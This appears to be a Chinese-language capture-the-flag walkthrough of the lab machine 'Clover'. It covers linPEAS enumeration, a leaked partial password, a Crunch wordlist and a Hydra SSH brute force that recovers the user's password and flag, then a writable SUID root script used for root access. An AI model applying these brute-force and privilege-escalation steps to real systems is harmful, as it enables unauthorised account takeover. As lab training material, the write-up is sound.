-rw-r--r-- 1 root root 2461 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-why.page                                                                     
-rw-r--r-- 1 root root 3602 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-how.page                                                                     
-rw-r--r-- 1 root root 3793 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-what.page                                                                    
-rw-r--r-- 1 root root 2969 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-check.page                                                                   
-rw-r--r-- 1 root root 2340 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3391 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2108 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1397 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1348 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2432 Oct 20  2014 /usr/share/help/pa/gnome-help/backup-how.page

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)                                                                              
Found /home/asta/.cache/tracker/meta.db: SQLite 3.x database                   
Found /home/asta/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database
Found /home/asta/.local/share/zeitgeist/activity.sqlite: SQLite 3.x database
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
Found /var/lib/colord/mapping.db: SQLite 3.x database
Found /var/lib/colord/storage.db: SQLite 3.x database
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database


╔══════════╣ Web files?(output limit)
/var/www/:                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K Mar 17  2021 .
drwxr-xr-x 14 root root 4.0K Mar 26  2021 ..
drwxr-xr-x  4 root root 4.0K Mar 26  2021 html

/var/www/html:
total 32K
drwxr-xr-x 4 root root 4.0K Mar 26  2021 .
drwxr-xr-x 3 root root 4.0K Mar 17  2021 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                     
-r--r--r-- 1 root root 11 Dec 14 02:28 /tmp/.X0-lock                           
-rw-r--r-- 1 root root 0 Dec 14  2025 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Nov  5  2016 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Mar 17  2021 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Mar 17  2021 /etc/.java/.systemPrefs/.system.lock
-rw------- 1 root root 0 Mar 17  2021 /etc/.pwd.lock
-rw-r----- 1 asta asta 0 Apr  7  2021 /home/asta/.local/share/tracker/data/.meta.isrunning
-rw-r--r-- 1 asta asta 0 Apr  7  2021 /home/asta/.local/share/.converted-launchers
-rwx------ 1 asta asta 220 Mar 17  2021 /home/asta/.bash_logout
-rw------- 1 asta asta 318 Apr  7  2021 /home/asta/.ICEauthority
-rw-r--r-- 1 root root 29 Mar 17  2021 /usr/lib/pymodules/python2.7/.path
-rw-r--r-- 1 root root 2439 Apr 27  2020 /usr/lib/jvm/.java-1.7.0-openjdk-amd64.jinfo
-rw-r--r-- 1 root root 6148 Mar 26  2021 /var/www/html/website/images/.DS_Store
-rw------- 1 Debian-gdm Debian-gdm 9094 Dec 14 02:28 /var/lib/gdm3/.ICEauthority

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                         
-r--r--r-- 1 root root 11 Dec 14 02:28 /tmp/.X0-lock                           
-rwxr-xr-x 1 asta asta 971926 Dec 14 02:54 /tmp/linpeas.sh
-rw-r--r-- 1 root root 5174 Mar 17  2021 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 root root 5332 Mar 24  2021 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 112640 Mar 27  2021 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 144 Mar 27  2021 /var/backups/reminder/passwd.sword
-rw-r--r-- 1 root root 0 Feb 29  2020 /var/lib/firebird/2.5/backup/no_empty

╔══════════╣ Searching passwords in history files
Binary file /usr/share/phpmyadmin/js/openlayers/theme/default/img/navigation_history.png matches

╔══════════╣ Searching passwords in config PHP files
/etc/phpmyadmin/config.inc.php:    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/etc/phpmyadmin/config.inc.php:// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/usr/share/phpmyadmin/config.sample.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;                                                            
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['nopassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['ShowChgPassword'] = true;

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                      
/bin/systemd-tty-ask-password-agent
/etc/java-7-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/lib/libreoffice/program/libpasswordcontainerlo.so
/usr/lib/libreoffice/share/config/soffice.cfg/cui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/modules/scalc/ui/retypepassworddialog.ui
/usr/lib/libreoffice/share/config/soffice.cfg/sfx/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/masterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/setmasterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/vcl/ui/cupspassworddialog.ui
/usr/lib/mysql/plugin/debug/validate_password.so
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/pppd/2.4.6/passwordfd.so
/usr/lib/pymodules/python2.7/ndg/httpsclient/test/pki/localhost.key
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/dns/root.key
/usr/share/doc/dialog/examples/password
/usr/share/doc/dialog/examples/password1
/usr/share/doc/dialog/examples/password2
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/doc/p7zip-full/DOCS/MANUAL/switches/password.htm
/usr/share/gnome-documents/js/password.js
/usr/share/help/as/gnome-help/user-changepassword.page
/usr/share/help/as/gnome-help/user-goodpassword.page
/usr/share/help/bg/evince/password.page
/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
/usr/share/help/bg/zenity/password.page
/usr/share/help/ca/empathy/irc-nick-password.page
/usr/share/help/ca/evince/password.page
/usr/share/help/ca/file-roller/password-protection.page
/usr/share/help/ca/file-roller/troubleshooting-password.page
/usr/share/help/ca/gnome-help/user-changepassword.page
/usr/share/help/ca/gnome-help/user-goodpassword.page
/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ca/zenity/password.page
/usr/share/help/C/empathy/irc-nick-password.page
/usr/share/help/C/evince/password.page
/usr/share/help/C/file-roller/password-protection.page
/usr/share/help/C/file-roller/troubleshooting-password.page
/usr/share/help/C/gnome-help/user-changepassword.page
/usr/share/help/C/gnome-help/user-goodpassword.page
/usr/share/help/C/seahorse/keyring-update-password.page
/usr/share/help/C/seahorse/passwords.page
/usr/share/help/C/seahorse/passwords-stored-create.page
/usr/share/help/C/seahorse/passwords-view.page
  #)There are more creds/passwds files in the previous parent folder

/usr/share/help/cs/evince/password.page
/usr/share/help/cs/file-roller/password-protection.page
/usr/share/help/cs/file-roller/troubleshooting-password.page
/usr/share/help/cs/gnome-help/user-changepassword.page

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                               
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                               
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/dpkg.log.1:2021-03-17 14:02:15 configure base-passwd:amd64 3.5.37 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:15 install base-passwd:amd64 <none> 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:15 status half-configured base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:15 status half-installed base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:15 status unpacked base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:16 status installed base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:28 status half-configured base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:28 status half-installed base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:28 status unpacked base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:28 upgrade base-passwd:amd64 3.5.37 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:36 install passwd:amd64 <none> 1:4.2-3+deb8u4
/var/log/dpkg.log.1:2021-03-17 14:02:36 status half-installed passwd:amd64 1:4.2-3+deb8u4
/var/log/dpkg.log.1:2021-03-17 14:02:37 status unpacked passwd:amd64 1:4.2-3+deb8u4
/var/log/dpkg.log.1:2021-03-17 14:02:46 configure base-passwd:amd64 3.5.37 <none>
/var/log/dpkg.log.1:2021-03-17 14:02:46 status half-configured base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:46 status installed base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:46 status unpacked base-passwd:amd64 3.5.37
/var/log/dpkg.log.1:2021-03-17 14:02:50 configure passwd:amd64 1:4.2-3+deb8u4 <none>
/var/log/dpkg.log.1:2021-03-17 14:02:50 status half-configured passwd:amd64 1:4.2-3+deb8u4
/var/log/dpkg.log.1:2021-03-17 14:02:50 status installed passwd:amd64 1:4.2-3+deb8u4
/var/log/dpkg.log.1:2021-03-17 14:02:50 status unpacked passwd:amd64 1:4.2-3+deb8u4
/var/log/installer/status:Description: Set up users and passwords

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars                                             
HOME=/home/asta                                                                
LANG=en_US.UTF-8
_=./linpeas.sh
LOGNAME=asta
MAIL=/var/mail/asta
NOTIFY_SOCKET=/run/systemd/notify
OLDPWD=/
PWD=/tmp
SHELL=/bin/bash
SHLVL=1
SSH_CLIENT=172.16.55.210 58162 22
SSH_CONNECTION=172.16.55.210 58162 172.16.53.36 22
SSH_TTY=/dev/pts/0
TERM=xterm-256color
USER=asta
XDG_RUNTIME_DIR=/run/user/1000


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                            
                                ╚════════════════╝                             
Regexes to search for API keys aren't activated, use param '-r' 

```

```bash
asta@Clover:/var/backups/reminder$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Mar 27  2021 .
drwxr-xr-x 3 root root 4096 Dec 14 01:02 ..
-rw-r--r-- 1 root root  144 Mar 27  2021 passwd.sword
asta@Clover:/var/backups/reminder$ cat passwd.sword 
Oh well, this is a reminder for Sword's password. I just remember this:

passwd sword: P4SsW0rD**** 

I forgot the last four numerical digits! 
```

补全后四位数密码

# Crunch
```bash
man crunch
-t @,%^
              Specifies  a pattern, eg: @@god@@@@ where the only the @'s, ,'s,
              %'s, and ^'s will change.
              @ will insert lower case characters
              , will insert upper case characters
              % will insert numbers
              ^ will insert symbols
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# crunch 12 12 0123456789 -t "P4SsW0rD%%%%" -o passwd
Crunch will now generate the following amount of data: 130000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```

# Sword爆破
```bash
──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# hydra -l sword -P ./passwd ssh://172.16.53.36 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-14 03:04:46
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://172.16.53.36:22/
[STATUS] 76.00 tries/min, 76 tries in 00:01h, 9924 to do in 02:11h, 4 active
[STATUS] 79.67 tries/min, 239 tries in 00:03h, 9761 to do in 02:03h, 4 active
[STATUS] 66.57 tries/min, 466 tries in 00:07h, 9534 to do in 02:24h, 4 active
[STATUS] 70.00 tries/min, 1050 tries in 00:15h, 8950 to do in 02:08h, 4 active
[STATUS] 81.35 tries/min, 2522 tries in 00:31h, 7478 to do in 01:32h, 4 active
[STATUS] 87.53 tries/min, 4114 tries in 00:47h, 5886 to do in 01:08h, 4 active
[22][ssh] host: 172.16.53.36   login: sword   password: P4SsW0rD4286
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-14 03:53:45

```

爆破了好久啊



## sword
```bash
sword@Clover:~$ cat local2.txt 





     /\
    // \
    || |
    || |
    || |      Sword PWN!
    || |
    || |
    || |
 __ || | __
/___||_|___\
     ww
     MM
    _MM_
   (&<>&)
    ~~~~




e63a186943f8c1258cd1afde7722fbb4
```

```bash
sword@Clover:~$ id uid=1001(sword) gid=1001(sword) groups=1001(sword)
sword@Clover:~$ find / -type f -perm -4000 -exec ls -lh {} \; 2>/dev/null
-rwsr-xr-x 1 root root 89K Oct 19  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 27K Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root root 143K Mar 22  2019 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 35K Aug 15  2018 /bin/fusermount
-rwsr-xr-x 1 root root 40K Mar 29  2015 /bin/mount
-rwsr-xr-- 1 root dip 326K Feb  9  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 1012K May 16  2020 /usr/sbin/exim4
-rwsr-xr-x 1 root root 44K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/chfn
-rwsr-sr-x 1 root mail 88K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 155K Feb  1  2020 /usr/bin/sudo
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/passwd
-rwsr-sr-x 1 root root 9.9K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 23K Jan 28  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 74K May 17  2017 /usr/bin/gpasswd
-rwsrwsrwx 1 root sword 195K Mar 24  2021 /usr/games/clover/deamon.sh
-rwsr-xr-x 1 root root 9.9K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 15K Jan 28  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 14K Aug 31  2018 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 455K Mar 25  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 292K Jun  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
sword@Clover:~$ 

```

> -rwsrwsrwx 1 root sword 195K Mar 24  2021 /usr/games/clover/deamon.sh
>
> 为什么这是“必死洞”？
>
>     SUID = root
>
>     owner = root
>
>     group = sword
>
>     权限 = 777（rwsrwsrwx）
>
>     而且是脚本（.sh）
>
> 👉 你（sword）可以直接修改一个“以 root 身份执行的脚本”
>
> 这是 Linux 提权里最致命的错误配置。
>

环境被我破坏掉了贴下wp的图片吧

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765704654081-0b410582-9b48-4906-b539-2cf7506c3d90.png)

访问发现实则是lua程序

查找lua提权

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765704615086-413b66dc-f73d-4418-97b0-4a7d49536f9a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765704631992-4c88a405-40f5-4b3a-b30c-1ef6d54d7645.png)

运行命令后，我们获得了壳级访问权限。我们通过运行 id 命令确认我们现在已经成为 root 权限来验证。

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765704677772-490c8375-8c2d-4656-899c-59528a066b68.png)





